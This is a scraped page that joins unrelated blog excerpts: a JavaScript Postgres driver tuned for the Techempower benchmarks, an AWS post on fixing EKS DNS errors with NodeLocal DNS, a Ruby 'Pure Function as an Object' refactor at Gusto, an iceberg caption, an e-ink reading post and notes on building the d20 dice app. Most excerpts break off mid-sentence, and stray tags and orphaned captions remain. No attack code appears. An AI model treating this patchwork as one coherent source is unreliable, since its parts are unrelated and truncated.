<p>My initial attempt was using a <a target="_blank" rel="noopener" href="https://github.com/just-js/modules/tree/0.0.5/pg">C++ module</a> interfacing with the official <a target="_blank" rel="noopener" href="https://www.postgresql.org/docs/current/libpq.html">libpq</a> c api. I did a lot of testing and traffic analysis against this and came up against bottlenecks I could not explain so decided to abandon it and try to write a Javascript library to interface with Postgres instead. I later discovered (by examining the source code of the other frameworks) that there is <a target="_blank" rel="noopener" href="https://www.postgresql.org/message-id/attachment/112272/v18-0001-libpq-batch-support.patch">a patchset</a> for libpq which resolves these issues so I may revisit the C++ binding in the future.</p>
<p>After a number of days poring over the postgres docs and testing, I was happy with the surprisingly good results I was seeing from the <a target="_blank" rel="noopener" href="https://github.com/just-js/techempower/blob/0.0.5/lib/pg.js">Javascript code</a> i put together. I had to work hard to ensure I was doing as few heap allocations as possible and implemented many optimizations like being able to <a target="_blank" rel="noopener" href="https://github.com/just-js/techempower/blob/0.0.5/lib/connection.js#L138">pre-compile</a> the queries into ArrayBuffers and using prepared statements in Postgres, which is much faster than doing raw Sql queries.</p>
<p>Here is a little snippet of How the pre-compiled queries work:</p>
<pre><code>
sock.allFortunes = await compile(sock, {
  formats: [],
  sql: 'select * from Fortune',
  fields: [{ format: 1, oid: INT4OID }, { format: 0, oid: VARCHAROID }],
  name: 's2',
  portal: '',
  maxRows: 0,
  htmlEscape: true,
  params: []
})
</code>
</pre>
<p>and how this is called:</p>
<pre><code>
const { allFortunes } = sock

allFortunes.call(() =&gt; {
  const html = getHTML(insertionSort([extra, ...allFortunes.getRows()]))
  sock.writeString(`${rHTML}${utf8Length(html)}${END}${html}`)
})
</code>
</pre>
<h3>Micro Optimisations</h3>
<p>I also added some further optimizations which allowed me to squeeze out a few more drops of performance:</p>

<li>Using <a target="_blank" rel="noopener" href="https://github.com/lucagez/slow-json-stringify">slow-json-stringify</a> instead of native JSON.stringify made a small but noticeable difference across the board.</li>
<li>Doing the HTML escaping <a target="_blank" rel="noopener" href="https://github.com/just-js/techempower/blob/0.0.5/lib/connection.js#L238">at the same time</a> as reading the strings from the ArrayBuffers coming back from Postgres made quite a difference in the Fortunes test. Strings are allocated on the v8 heap and if they are short lived they have to be garbage collected which hurts performance quite a lot. I admit escaping the string at the database driver level is a little bit of a cheat so I will likely revisit this when I have some time.</li>
<li>I noticed that other frameworks were using single queries to do the updates rather than a query for each update and adopted this approach too. You can see what that looks like <a target="_blank" rel="noopener" href="https://github.com/just-js/techempower/blob/0.0.5/techempower.js#L45">here</a>.</li>
<li>I was unable to find a fast enough html templating library for the Fortunes test so need to do some further work to come up with an optimal solution for that. For now, the html is <a target="_blank" rel="noopener" href="https://github.com/just-js/techempower/blob/0.0.5/techempower.js#L175">being built manually</a> which is again a little bit of a cheat, but I am confident I can find something that works and provides equivalent performance.</li>
<li>Because the resultsets for the Fortunes test are small I found a simple <a target="_blank" rel="noopener" href="https://github.com/just-js/techempower/blob/0.0.5/techempower.js#L188">insertion sort</a> was quicker than the out of the box Array.sort in Javascript/v8.</li>
</ul>
<h2>Techempower Environment</h2>
<p>Techempower run <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=environment">the tests</a> on 3 Dell R440 servers, each of which has an Intel Xeon Gold 5120 CPU with 28 threads and a dedicated Cisco 10Gbps ethernet adapter.</p>
<p>The framework being tested runs on one machine, the database on another and the benchmarking tool (which uses <a target="_blank" rel="noopener" href="https://github.com/wg/wrk">wrk</a>) runs on the third. Everything runs inside of docker using Host networking so the overhead from that should be minimal.</p>
<h2>Initial Submission</h2>
<p>Having done all this work, I was now seeing Just(js) match the top performing frameworks on my local tests so was reasonably confident I could score well in the production techempower environment.</p>

<p>
Final Results of Local Tests
</p>
<p>I submitted my pull request, had it reviewed and accepted and then waited anxiously while the techempower servers churned through the tests. The total run takes about 5 days each time so I was hugely disappointed when my initial submission failed on the production run. This was down to DNS working differently in the production environment than it does in techempower's CI system and my code not handling this correctly.</p>
<p>I made <a target="_blank" rel="noopener" href="https://github.com/TechEmpower/FrameworkBenchmarks/pull/5998/files#diff-8ea032b8acd0d08eacd31ec942cbde8316c4f868c29551ef758f3a889f5df23a">some changes</a> to the dns code to use /etc/resolv.conf and /etc/hosts to determine the IP address of the database once I realised the production environment was using the <b>--add-host</b> docker option to inject the database IP address into the container /etc/hosts file.</p>
<p>Thankfully, after some more anxious waiting, the tests were successful next time around but I was a little disappointed to see Just(js) had only <a target="_blank" rel="noopener" href="https://www.techempower.com/benchmarks/#section=test&amp;runid=8ee18501-8947-4847-9449-f8b5dde1ba2d&amp;hw=ph&amp;test=composite&amp;a=2">placed 5th</a> overall, scoring roughly 70% of the best performing framework.</p>

<p>
Results of Initial Run on Techempower
</p>
<p>After my intial disappointment, I decided this was actually quite a respectable score, with only lower level Rust and C++ frameworks scoring higher, so I took a break for a few days and pondered what could be causing the discrepancy between my local tests and the ones in the production environment.</p>
<p>With my batteries recharged, I decided to rent some time on a similarly specced server from <a target="_blank" rel="noopener" href="https://www.packet.com/">Packet.com</a> (now Equinix Metal) to see if i could reproduce the issue in a similar environment. After a lot of perf and strace investigation I noticed that there was a huge amount of system call overhead. This was being dominated by calls to pthread_mutex_lock and pthread_mutex_unlock, so I decided to dig into the v8 code to see what could be causing this.</p>
<p>I eventually tracked the issue down to <a target="_blank" rel="noopener" href="https://github.com/v8/v8/blob/8.5.210/src/heap/array-buffer-tracker-inl.h#L75">this code</a>. It seems that every time we call …</p></div></div>

                <p>Got to blog on the AWS Containers Blog: <a href="https://aws.amazon.com/blogs/containers/eks-dns-at-scale-and-spikeiness/">EKS DNS at scale and spikeiness</a>! 🎉</p>
<p>I usually just get to mentor people, and they get to post stuff publicly, so this is a nice change!</p>

<p>The AWS Containers Blog now <a href="https://github.com/aws/containers-roadmap/issues/303">seems to be missing my blog post</a>, so here’s a copy:</p>
</blockquote>
<h2 id="eks-dns-at-scale-and-spikeiness">EKS DNS at scale and spikeiness</h2>
<p><em>This is a guest post by&nbsp;Vlad Ionescu for Ownzones.</em></p>
<p>In his post we will discuss the issue of DNS errors at scale, that is, several hundreds to thousands of nodes, showing how the problems can be mitigated. This was an obstacle that affected Ownzones for several months and a problem that we expect everybody at scale will encounter. Two solutions will be proposed and their implementation will be discussed. Troubleshooting steps are shared for easy identification of the problem.</p>
<p>Ownzones is a pioneering technological force that’s transforming the OTT industry with ground-breaking innovations. Our product Ownzones Connect is a cloud-native platform, which leverages our proprietary technology as well as the best tools in the industry to provide studios an agile, low-cost solution for global distribution and localization. Some of the key features include the world’s first fully cloud-based, parallel processing IMF transcoder.</p>
<h3 id="problem">Problem</h3>
<p>At Ownzones, we run our applications in containers for increased developer velocity. Due to rather intense scaling requirements — a multi-TB movie comes in and needs to be processed as soon as possible — the decision was made to use Kubernetes for container orchestration. Since we are running in AWS, we make use of the amazing <a href="https://aws.amazon.com/eks/">Amazon Elastic Kubernetes Service</a> or EKS for short. We leverage other AWS services such as <a href="https://aws.amazon.com/rds/">Amazon Relational Database Service</a>, <a href="https://aws.amazon.com/elasticache/">Amazon ElastiCache</a>, and more. We manage all the services and infrastructure configuration in code with <a href="https://www.terraform.io/">Terraform</a> and we practice gitops with <a href="https://www.runatlantis.io/">Atlantis</a>.</p>
<p>The EKS clusters are running version 1.12 and we are in the process of upgrading all our clusters to 1.13. Each cluster has a different configuration depending on the customer needs for scale, but all of them scale a lot. As soon as jobs come in — be they transcoding jobs, media analysis jobs, deliveries, or anything else — the EKS clusters are scaled up by cluster-autoscaler. At peak, clusters may scale to hundreds or thousands of nodes to process the work as soon as possible.</p>
<p>The problems started to appear when customers or internal testing teams were scaling the system to higher limits, such as when transcoding or using FrameDNA to analyze large films or libraries of content. When the Kubernetes cluster was doing intense work and scaling above several hundreds of nodes, the processing time was stagnating or increasing. Having built a cloud native solution, the expectation was that adding additional processing power would lower the processing time.</p>
<p>We quickly established a cross-functional task force to investigate this issue.</p>
<p>A multitude of tools are used for observability at Ownzones: <a href="https://honeycomb.io/">Honeycomb</a> for events and traces, Sysdig for monitoring, Papertrail for logs, <a href="https://sentry.io/">Sentry</a> for error tracking, and more. Investigation into traces from Honeycomb showcased DNS resolution times taking seconds or more:</p>
<figure>
    <img src="https://www.vladionescu.me/posts/eks-dns/1-DNS-lookup-to-s3-taking-1-second.png" alt="A screenshot of a Honeycomb trace showing the DNS lookup for an S3 connection taking almost one second."> <figcaption>
            <p>A DNS lookup for S3 taking almost 1 second</p>
        </figcaption>
</figure>

<p>In some cases DNS lookups were taking multiple seconds:</p>

            <p>Sometimes DNS resulution spiked to multiple seconds</p>
        </figcaption>
</figure>

<p>Looking further into network metrics showed DNS errors spiking while work was being processed and recovering when the work was finished:</p>
<figure>
    <img src="https://www.vladionescu.me/posts/eks-dns/3-graph-showing-2-spikes-in-DNS-errors.png" alt="A screenshot of a Sysdig DNS errors graph showing spies in DNS errors"> <figcaption>
            <p>DNS errors spiking when work was happening</p>
        </figcaption>
</figure>

<p>The culprit was identified: when reaching a certain scale, a significant number of DNS errors (<code>EAI_AGAIN</code> and <code>ENOTFOUND</code>) that were leading to a lot of retries. Operations that were supposed to take a couple minutes were taking orders or magnitude longer. For example, transcoding a single 4K feature film in Ownzones Connect takes around 16 minutes. During this time, the EKS cluster is scaled to hundreds of nodes, which are peaking at 1.64 TB/s network traffic to S3 and 8.55k requests per second to S3.&nbsp;&nbsp;And that is for a single video track! Processing files in massively parallel ways is where cloud native approaches shine and Ownzones Connect is fully taking advantage of that. The result is a massive spike of work and DNS traffic. Having multi-second lookup times when doing 8.550 requests per second to S3 adds up to quite a lot.</p>
<p>Since the cause was narrowed down to DNS, the next step was to contact AWS Support.&nbsp;The DNS issues were appearing at scale and spiky workloads were especially affected. After investigation by AWS it was confirmed that the VPC networking was not experiencing elevated error rates, nor was S3.&nbsp;It was pointed out that due to the <a href="https://docs.aws.amazon.com/vpc/latest/userguide/vpc-dns.html#vpc-dns-limits">Amazon VPC DNS Limits</a> of 1024 packets per second per network interface the EKS-default 2 CoreDNS pods can be quickly overloaded. Each CoreDNS pod has to serve DNS traffic from the host through its own elastic network interface, which is limited to 1024 packets per second.</p>
<h3 id="attempt-one-increasing-coredns-pods">Attempt one: increasing CoreDNS pods</h3>
<p>The first and easiest improvement for DNS failures was to increase the number of CoreDNS pods. By default EKS has two replicas and that can be increased:</p>
<pre><code data-lang="console">kubectl scale deployment/coredns \
    --namespace kube-system \
    --current-replicas=2 \
    --replicas=10
</code></pre><p>At Ownzones, we run both on On-Demand Instances as well as on Spot Instances. This is not ideal as CoreDNS pods could be scheduled on a Spot Instance, which may be terminated at any time and potentially add disruption.</p>
<p>To work around this we edited the CoreDNS deployment to only run on On-Demand EC2 instances which we have tagged with the <code>stable</code> label:</p>
<pre><code data-lang="console">kubectl --namespace kube-system edit deployment/coredns

    ...
    spec:
        affinity:
        nodeAffinity:
            requiredDuringSchedulingIgnoredDuringExecution:
            nodeSelectorTerms:
            - matchExpressions:
                - key: beta.kubernetes.io/os
                operator: In
                values:
                - linux
                - key: beta.kubernetes.io/arch
                operator: In
                values:
                - amd64
                - key: nodegroup
                operator: In
                values:
                - stable
        containers:
            ...

</code></pre><p>Scaling the CoreDNS pods was an improvement, but we still saw significant error rates. We had thousands of nodes sending network traffic to 10 CoreDNS pods, which were spread on significantly fewer On-Demand nodes.</p>
<h3 id="attempt-two-node-local-dns">Attempt two: Node-local DNS</h3>
<p>Kubernetes developers have an addon that addresses the DNS problem: <a href="https://github.com/kubernetes/kubernetes/tree/master/cluster/addons/dns/nodelocaldns">NodeLocal DNS Cache</a>. Using this addon, a new CoreDNS DaemonSet can be configured so it runs on each node. Those new CoreDNS pods will act as a DNS cache: all pods on a specific node would have their requests sent to the local CoreDNS pod which would either serve a result from cache or forward the request upstream to the main CoreDNS pods.</p>
<p>This massively lowers the volume of DNS queries and makes spike handling a breeze and follows <a href="https://aws.amazon.com/premiumsupport/knowledge-center/dns-resolution-failures-ec2-linux/?nc1=h_ls">the AWS recommendation to cache DNS</a>.&nbsp;The first step is to decide which IP will be used for NodeLocal DNS. Typically <code>169.254.20.10</code> is chosen.</p>
<p>With the IP address decided, the YAML files from <a href="https://github.com/kubernetes/kubernetes/tree/release-1.15/cluster/addons/dns/nodelocaldns">k/k/cluster/addons/dns/nodelocaldns</a> need to be acquired. They cannot be applied directly as some values need to be replaced:</p>
<ul>
<li><code>__PILLAR__DNS__DOMAIN__</code> with <code>cluster.local</code> as per <a href="https://github.com/awslabs/amazon-eks-ami/blob/28845f97c05dacaf699a102faa690a4238b79f02/files/kubelet-config.json#L24">amazon-eks-ami’s kubelet-config.json.</a></li>
<li><code>__PILLAR__LOCAL__DNS__</code> with <code>169.254.20.10</code>, which is like the default address chosen above that the Node-local DNS will bind to on each node.</li>
<li><code>__PILLAR__DNS__SERVER__</code> with <code>10.100.0.10</code> or <code>172.20.0.10</code> depending on the VPC CIDR. <a href="https://github.com/awslabs/amazon-eks-ami/blob/ca61cc2bb6ef6fe982cc71ede7552a4a2c6b93e9/files/bootstrap.sh#L167-L170">On EKS</a>, the DNS Service is running at one of the two IPs and the relevant one needs to be chosen. The value can be seen by running <code>kubectl -n kube-system get service kube-dns</code> and checking the cluster IP.</li>
</ul>
<p>After the values are replaced the files have to be applied:</p>
<pre><code data-lang="console">kubectl apply -f nodelocaldns.yaml
</code></pre><p>This is not enough: Node-local DNS was installed, but it is not used by the pods! To actually have the pods use Node-local DNS the kubelet running on each node needs to be configured. The DNS resolver for the pods needs to point to the newly created Node-local DNS server running at <code>169.254.20.10</code> on each node.</p>
<p>Users of the amazing <a href="https://eksctl.io/">eksctl</a> project can easily configure this since <a href="https://github.com/weaveworks/eksctl/pull/550">support was added in February</a> by editing the node group definition:</p>
<div><pre><code data-lang="yaml">
...
<span>nodeGroups</span>:
- <span>name</span>: <span>mygroup</span>
    <span>clusterDNS</span>: <span>169.254.20.10</span>
...

</code></pre></div><p>Users of <a href="https://github.com/terraform-aws-modules/terraform-aws-eks">the Terraform community EKS module</a> have to send an extra parameter to the <code>kubelet</code> binary in the worker group definition:</p>
<div><pre><code data-lang="hcl">
...
worker_groups_launch_template <span>=</span> [
    {
        ...
        name <span>=</span> <span>"mygroup"</span>
        kubelet_extra_args <span>=</span> "--node-labels<span>=</span>kubernetes.io/lifecycle<span>=</span>spot,nodegroup<span>=</span>mygroup --cluster-dns<span>=</span><span>169</span>.<span>254</span>.<span>20</span>.<span>10</span><span>"</span>
        ...
    },
    {
        ...
    },
]
...

</code></pre></div><p>That’s all!</p>
<p>At Ownzones, we have been running the above setup in production for more than 2 months on Amazon EKS and Kubernetes 1.12 with very good results. DNS errors have fallen drastically with 99% of DNS queries resolved in less than 2ms during stress-testing:</p>

            <p>Dramatic improvement in DNS resolution</p>
        </figcaption>
</figure>

<h3 id="troubleshooting-tips">Troubleshooting tips</h3>
<p>Identifying the need for a more in-depth DNS configuration is not straightforward. Debugging Node-local DNS is a task in itself that requires networking experience and familiarity with networking in Kubernetes.</p>
<p>To lower the time investment, we can share two pointers that would have helped us a lot when starting the investigation.</p>
<h4 id="visibility">Visibility</h4>
<p>Knowing how many CoreDNS replicas to use and knowing if NodeLocal DNS is needed are both two very hard questions. Prometheus and Grafana can showcase the relevant metrics on the <a href="https://grafana.com/grafana/dashboards/7279">CoreDNS dashboard</a>.</p>
<p>While at Ownzones we debugged resolution issues with <a href="https://www.honeycomb.io/">Honeycomb</a>, a tracing solution combined with a rich monitoring setup will likely reach the same depth. An important point is for the investigation to happen …</p></div></div>

  <article>
    <p>At <a href="https://gusto.com/">Gusto</a>, we’ve been knee-deep in a substantial refactor of our system for running payrolls.</p>

<p>Running a payroll requires taking several different inputs such as how much an employee should get paid, where did they work, how much did they work, how much taxes should they pay, how much taxes have they paid this year, and so on and so on.</p>

<p>As a company that offers a payroll service, keeping this piece of the system in tip-top shape is important for the business. Customers love Gusto for its simplicity and speed when it comes to running payroll.</p>

<p>Over the years, this system grew beyond its original mandate. Rather than just serve payroll for one state, it now serves them for all 50 states and the District of Columbia. Although customers love our payroll, internally new engineers had a difficult time understanding the code and making changes safely. This system needed a tune up, so we embarked on a sizable refactor.</p>

<p>Because the process of calculating what you need for a payroll is one big formula, we set the goal of making this system “more functional” as in functional programming. We wanted to take the process of calculating a payroll and make it one big stateless operation.</p>

<p>The server-side code at Gusto is written in Ruby, a language usually known for its object-oriented and metaprogrammatic roots. Nonetheless, we wanted to integrate some more functional concepts into our code in the hopes of increasing the system’s safety and clarity. The result has been maintainable code that is easier to reason about and safer to change.</p>

<h2 id="embracing-the-pfaao">Embracing the PFaaO</h2>

<p>Ruby is an expressive language, but it does not lend itself to some common functional practices. Although Ruby allows for closures and first-class functions via <code>Proc</code>s, one does not see many <code>Proc</code>s passed around as objects in idiomatic Ruby.</p>

<p>Throughout our work, we discovered that you can create expressive interfaces with clean internals by embracing both OO and functional aspects of Ruby.</p>

<p>To do this, we used a pattern called <a href="https://www.tomdalling.com/blog/ruby/pure-function-as-an-object-PFAAO-pattern/">Pure Function as an Object (PFaaO)</a>. Essentially, you design objects as you would a <a href="https://en.wikipedia.org/wiki/Pure_function">pure function</a> but dress them up as Ruby classes.</p>

<p>A pure function is a function without observable side effects that always returns the same value for a given set of inputs. That means no talking to the database, no modifying the state of other objects, no accessing the system clock, etc. When we write a PFaaO in Ruby, we want to build an object that has no side effects.</p>

<p>A simple PFaaO might look like the following:</p>

<div><div><pre><code><span>class</span> <span>PayrollCalculator</span>
  <span>def</span> <span>self</span><span>.</span><span>calculate</span><span>(</span><span>payroll</span><span>)</span>
    <span>new</span><span>(</span><span>payroll</span><span>).</span><span>calculate</span>
  <span>end</span>

  <span>def</span> <span>initialize</span><span>(</span><span>payroll</span><span>)</span>
    <span>@payroll</span> <span>=</span> <span>payroll</span>
  <span>end</span>
  <span>private_class_method</span> <span>:new</span>

  <span>def</span> <span>calculate</span>
    <span>PayrollResult</span><span>.</span><span>new</span><span>(</span>
      <span>payroll: </span><span>payroll</span><span>,</span>
      <span>paystubs: </span><span>paystubs</span><span>,</span>
      <span>taxes: </span><span>taxes</span><span>,</span>
      <span>debits: </span><span>debits</span>
    <span>)</span>
  <span>end</span>

  <span>def</span> <span>paystubs</span>
    <span># ...</span>
  <span>end</span>

  <span>def</span> <span>taxes</span>
    <span># ...</span>
  <span>end</span>

  <span>def</span> <span>debits</span>
    <span># ...</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>There’s quite a bit going on here, so let’s break it down bit by bit.</p>

<p>First, our class has only one effective public interface: <code>PayrollCalculator.calculate</code>. Because we’ve declared the constructor private using <code>private_class_method :new</code>, the instance method <code>#calculate</code> is effectively private.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p>

<p>This means that all of the other instance methods we declare are implicitly private, even though there is no explicit <code>private</code> block within this class. Because there’s no way to <code>.new</code> up an instance, there is not a vector to call any instance methods.</p>

<p>Our method only has one public interface and its designed operation is effectively stateless, therefore we only need to exercise one interface in our tests. Put some data in, assert that the data coming out is what we expected.</p>

<h2 id="referential-transparency-for-free">Referential Transparency for Free</h2>

<p>In our above example, let’s say that the process of calculating taxes is expensive from a time perspective.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Thus, we want to make a time/space tradeoff to consume more memory to minimize the number of times we need to compute taxes. In our example, calculating both <code>#paystubs</code> and <code>#debits</code> will require the result of <code>#taxes</code>.</p>

<p>Now because each of these private methods is a pure function, we have referential transparency. This means we can replace a method and its parameters with its return value. Think of it like algebra: Given the function <code>f(x) = x + 5</code>, you can safely replace any occurrence of <code>f(2)</code> with the value <code>7</code>.</p>

<p>What does this mean for a Rubyist? Free and safe memoization:</p>

<div><div><pre><code><span>def</span> <span>paystubs</span>
  <span>calculate_paystubs</span><span>(</span><span>taxes</span><span>,</span> <span>...</span><span>)</span>
<span>end</span>

<span>def</span> <span>debits</span>
  <span>calculate_debits</span><span>(</span><span>taxes</span><span>,</span> <span>...</span><span>)</span>
<span>end</span>

<span>def</span> <span>taxes</span>
  <span>@taxes</span> <span>||=</span> <span>calculate_taxes</span><span>(</span><span>@payroll</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>Memoization is a form of caching, and can be fraught with issues if the memoized value does not actually come from a pure function. But because we make everything within the PFaaO pure, we can safely memoize this method call.</p>

<p>This is interesting because it looks like this class is no longer stateless: it now assigns local values. However the only interface is the single <code>.calculate</code> class method, each instance of our PFaaO is single-use. Any intermediate state can never be accessed by externally. Because this cached state is not observable externally, our function is still technically pure.</p>

<p>Much in the way a developer can abstract synchronous and asynchronous behavior, you can do the same with functional purity. Any local state changes are irrelevant in the lifecycle of the PFaaO. These local state changes are not observable from the outside world.</p>

<h2 id="expanding-pfaaos">Expanding PFaaOs</h2>

<p>As I’ve grown in my career, I have become less interested in how software is written but how it is maintained. Software maintenance is the blessing and the curse of any successful project: <em>Congratulations!</em> You have a business with lasting value. <em>Our condolences!</em> You must now pay for all of your mistakes. Nonetheless, it is always preferred to have a business that exists with technical debt, than to have a bankrupt company with a pristine code base.</p>

<p>PFaaOs in Ruby are great because they are easy to maintain. Not only are they easy to test, but they are predisposed to healthy growth.</p>

<p>What do I mean by that?</p>

<p>Let’s again take the example of our <code>#taxes</code> method. Early in Gusto’s history (back when it was still known as ZenPayroll), we only offered payroll services in California. Thus, we only needed to worry about payroll taxes for California.</p>

<p>In the grand scheme of things, California is a simple state when it comes to payroll taxes. Our taxes method might have looked like nothing more than the following:</p>

<div><div><pre><code><span>def</span> <span>taxes</span>
  <span>federal_taxes</span><span>(</span><span>@payroll</span><span>)</span> <span>+</span>
    <span>california_taxes</span><span>(</span><span>@payroll</span><span>)</span> <span>+</span>
    <span>local_taxes</span><span>(</span><span>@payroll</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>Now let’s say we expanded into a new state, New York. Now our method grows a little bit:</p>

<div><div><pre><code><span>def</span> <span>taxes</span>
  <span>federal_taxes</span><span>(</span><span>@payroll</span><span>)</span> <span>+</span>
    <span>california_taxes</span><span>(</span><span>@payroll</span><span>)</span> <span>+</span>
    <span>new_york_taxes</span><span>(</span><span>@payroll</span><span>)</span> <span>+</span>
    <span>local_california_taxes</span><span>(</span><span>@payroll</span><span>)</span> <span>+</span>
    <span>local_new_york_taxes</span><span>(</span><span>@payroll</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>As we expand into every state,<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> this method will grow to be quite large! Furthermore, each of these methods adds to the length of our <code>PayrollCalculator</code> class. Without constant gardening, the class could become difficult to understand.</p>

<p>But because each of our methods within a PFaaO is itself a pure function, we are able to extract classes as we see fit and make each one a new PFaaO. We can safely replace our growing methods with new PFaaOs:</p>

<div><div><pre><code><span>def</span> <span>taxes</span>
  <span>PayrollCalculator</span><span>::</span><span>Taxes</span><span>.</span><span>calculate</span><span>(</span><span>@payroll</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>As we tease apart these different PFaaOs, we also get a much better idea of the input requirements for these service classes. Our <code>@payroll</code> is a large parameter object, and each extracted PFaaO probably only needs a subset of its data.</p>

<p>So we can get away with something like:</p>

<div><div><pre><code><span>def</span> <span>taxes</span>
  <span>PayrollCalculator</span><span>::</span><span>Taxes</span><span>.</span><span>calculate</span><span>(</span>
    <span>@payroll</span><span>.</span><span>only_pay_and_location_data</span>
  <span>)</span>
<span>end</span>
</code></pre></div></div>

<p>Here we assume that the <code>Payroll#only_pay_and_location_data</code> returns a slice of the total data within the instance as a new <a href="https://martinfowler.com/bliki/ValueObject.html">Value Object</a>. This Value Object represents only the data required to calculate the taxes part of running a payroll.</p>

<h2 id="data-is-immutable-by-default">Data is Immutable by Default</h2>

<p>Another important ingredient for scalable PFaaOs is the requirement that all data be immutable by default. <em>This is a drastic change from how most folks traditionally write Ruby.</em></p>

<p>Every time you reach for your <code>=</code>, you’ll need to replace it with a <code>#set</code> or <code>#put</code>. Rather than modifying objects in place, you will get used to returning new copies with new values. (<a href="https://github.com/hamstergem/hamster/">Hamster</a>, which provides great immutable data structures, can help you from having to hand-roll FP functionality.)</p>

<p>What does this mean for Rails? It will often mean creating functions or classes that take <code>ActiveRecord</code> objects and convert them into immutable value objects. For us, we carve out these value objects into the namespace of what we’re doing. For example, here are the two representations of a payroll in our system:</p>

<div><div><pre><code><span># app/models/payroll.rb</span>
<span>class</span> <span>Payroll</span> <span>&lt;</span> <span>ActiveRecord</span><span>::</span><span>Base</span>
<span>end</span>

<span># app/services/payroll_calculator/payroll.rb</span>
<span>class</span> <span>PayrollCalculator::Payroll</span> <span>&lt;</span> <span>ValueObject</span>
<span>end</span>
</code></pre></div></div>

<p>The <code>ActiveRecord</code> version of a payroll represents the data that lives in the database. It is a superset of the data required for actually running a payroll. Although they have the same name, they do not have the same attributes. For example, the <code>ActiveRecord</code> version of <code>Payroll</code> will have a <code>processed_at</code> attribute, whereas the <code>Payroll</code> that lives in the calculation domain does not.</p>

<p>In the words of <a href="https://kellysutton.com/2017/06/07/domain-driven-design.html"><em>Domain-Driven Design</em></a>, each namespace here is a different Bounded Context. We implement adapters to take <code>ActiveRecord</code> payrolls and turn them into <code>PayrollCalculator</code> payrolls, and vice versa.</p>

<p>The upside of this is the same that you might see in any other large system with well-defined abstractions; changes in models don’t cross domains. In our example, we can change the structure of the <code>Payroll</code> in our database without needing to change the calculation code. We would only need to change our adapter. Furthermore, this context is entirely separate from the machinations of Rails. We could easily and safely pull this into its own …</p></article></div></div></div></div>

    <p>In reality, an iceberg wouldn’t float <i>exactly</i> like this. Its three-dimensional distribution of mass and its relative density compared to the water are both significant factors that are only approximated here.</p>

The written word has had arguably more of an impact on my life than anything I have experienced in person. As a kid back in early 2000’s; this meant a lot of library trips and saving for paperbacks. I also caught the first wave of the e-ink revolution. Nothing beats a real book, in terms of textures and scents; but e-ink devices and the fantastic tools outlined here should make reading digital books much more palpable&nbsp;<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p><p>I have been reading on my <a href="https://en.wikipedia.org/wiki/Kobo%5FAura%5FHD">Kobo Aura HD</a> for almost a decade now, ever since its release. This means my setup is about as stable as its going to get in the near future. As good a time as any to collect my thoughts&nbsp;<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>. The focus is on e-ink devices and auxiliary tools; not on all digital content; so there are no mentions of syncing or reading on the go (with a phone) or of monitors which are good for reading on.</p><h3 id="the-content">The Content</h3><p>In general; my e-ink reading habits can be broadly broken into the following categories:</p><dl><dt>Light Reading</dt><dd>Practically this includes <a href="https://www.goodreads.com/user/show/33462912-rohit-goswami">anything I review on Goodreads</a>; these are not often re-read; nor read very deeply; since they are read for pleasure. They are however, rarely deleted</dd><dt>Required Reading</dt><dd>Anything which typically requires me to take notes or practice / write out proofs; these are most often considered to be either coursework (for someone somewhere) or research monographs.

                                                    <p>In hindsight, I can’t believe anyone paid money<sup id="fnref-516-v1"><a href="#fn-516-v1">1</a></sup> for the <a href="http://d20.blakewatson.com/">first version of d20</a>, which I released in <a href="https://blakewatson.com/journal/2016-my-year-in-review/#criticalhit"> September 2016</a>. But they did, and those few sells I made inspired a much more useful version 2, which was released in January 2018.</p>
<p>By the end of 2018, I had been using d20 extensively and running into some problems I wanted to address. I started writing some brand new code in December of that year. Two years and 144 commits later, I’m happy to announce that d20 version 3 is now for sale on the Mac App Store.</p>

<p>You can check out the <a href="https://d20app.me/">d20 website</a> or <a href="https://apps.apple.com/us/app/d20-an-rpg-dice-roller/id1156311750">Mac App Store page</a> if you want to know more about the features. But I want to get into the decision making process, tech stack, and other tangents regarding the making of d20. Imagine this as the director’s commentary.</p>
<h2>Electron: can’t live with it, can’t live without it</h2>
<p>The biggest non-decision was whether the app would be powered by <a href="https://www.electronjs.org/">Electron</a>, go fully native, or go fully web-based. I had already used Electron for the first two versions. But I felt guilty about it. Electron is basically Google Chrome and NodeJS smashed together, so it’s pretty big and resource intensive. Seeing as d20 has a simple interface, very limited scope in what it’s trying to accomplish, and is meant to be Mac-only, Electron was a really terrible option.</p>
<p>But I went with Electron again for the same reason every other web developer does—I know how to code for it without learning too much new stuff (e.g., Swift + Apple frameworks). Yes it’s way overkill, yes it’s absolutely ridiculous. But you either get d20 the Electron app, or you get nothing. That’s the great thing about Electron. It lowers the barrier to creating desktop applications and spawns tools and apps that otherwise would not exist. You’ll have to endure a little bit of ridicule from Hacker News and, if you’re like me, your inner-critic, but I say YOLO. Don’t let your dreams be dreams.</p>
<h2>RANDOM.ORG</h2>
<p>Since version 2, d20 has integrated with <a href="https://www.random.org/">RANDOM.ORG</a> to provide true random numbers rather than pseudorandom ones generated by JavaScript. This ended up being the catalyst that pushed me to finish version 3. RANDOM.ORG brought their API out of beta and began charging for it. My old API key was no longer working and so d20 was quietly falling back to using pseudorandom JavaScript RNG.</p>
<p>This was not cool, considering that true random numbers is one of d20’s unique selling points. I made the decision to move to the commercial API, which costs $12 per month. I don’t like incurring the extra costs each month, but I do make enough in sales to cover it and it is personally one of my favorite features of d20; so I gotta keep it in there.</p>
<h2>Vue, Sass, Laravel Mix</h2>
<p>I doubled down on using <a href="https://vuejs.org/">Vue</a>. I had used it in version 2 but I was new to it at the time and I did a really poor job of code organization. I feel like the new version is much better. I’m a different programmer than I was when I first started d20 v3 so there are definitely things I would change if I were starting today (like using <a href="https://www.typescriptlang.org/">TypeScript</a>). That’s just part of the consequences for taking two years to finish it.</p>
